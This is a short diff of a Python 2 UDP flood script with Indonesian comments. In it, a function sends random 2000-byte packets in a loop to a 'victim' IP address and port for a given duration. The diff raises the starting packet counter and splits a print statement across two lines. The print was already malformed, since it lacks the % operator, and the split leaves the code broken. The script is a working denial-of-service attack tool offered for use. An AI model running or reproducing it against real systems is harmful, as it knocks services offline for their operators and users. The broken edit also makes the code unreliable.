@@ -44,7 +44,7 @@ def flood(korbanmu, vport, durasi):
     # Gunakan Dengan Bijak Yah
     bytes = random._urandom(2000)
     timeout =  time.time() + durasi
-    sent = 2000
+    sent = 50000
 
     while 1:
         if time.time() > timeout:
@@ -53,7 +53,8 @@ def flood(korbanmu, vport, durasi):
             pass
         client.sendto(bytes, (korbanmu, vport))
         sent = sent + 1
-        print bcolors.HEADER + "[\033[92m%s\033[95m] UDP [\033[91m%s\033[95m] PORT [\033[94m%s\033[95m]" (sent, korbanmu, vport)
+        print bcolors.HEADER + "[\033[92m%s\033[95m] UDP [\033[91m%s\033[95m] PORT [\033[94m%s\033[95m]" 
+        (sent, korbanmu, vport)
 def main():
     print len(sys.argv)
     if len(sys.argv) != 4:
